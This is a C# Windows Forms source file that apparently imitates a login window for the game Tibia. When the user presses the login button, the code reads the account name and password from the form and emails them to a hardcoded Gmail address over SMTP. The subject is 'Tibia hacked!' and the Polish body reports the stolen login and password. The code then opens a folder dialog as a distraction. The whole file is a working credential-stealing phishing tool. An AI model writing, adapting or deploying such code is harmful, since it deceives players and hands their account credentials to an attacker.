using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Tibia
{
    public partial class Tibia : Form
    {
        private string _email = "email";
        private string _password = "password";
       
        public Tibia()
        {
            InitializeComponent();
        }

        private void LoginButton_Click(object sender, EventArgs e)
        {
            var mailMessage = new MailMessage(_email, _email);
            var mailClient = new SmtpClient("smtp.gmail.com", 587);

            mailClient.Credentials = new NetworkCredential(_email, _password);
            mailClient.EnableSsl = true;

            mailMessage.Subject = "Tibia hacked!";
            mailMessage.Body =
                $"Udało się odszyfrować dane użytkownika. " +
                $"Login: {accountNameTextBox.Text} " +
                $"Hasło: {passwordTextBox.Text}";

            mailClient.Send(mailMessage);

            using(var fbd = new FolderBrowserDialog())
            {
                DialogResult result = fbd.ShowDialog();

                if (result == DialogResult.OK && !string.IsNullOrWhiteSpace(fbd.SelectedPath))
                {
                    System.Windows.Forms.MessageBox.Show("Selected path: " + fbd.SelectedPath, "Message");
                }
            }


        }
    }
}
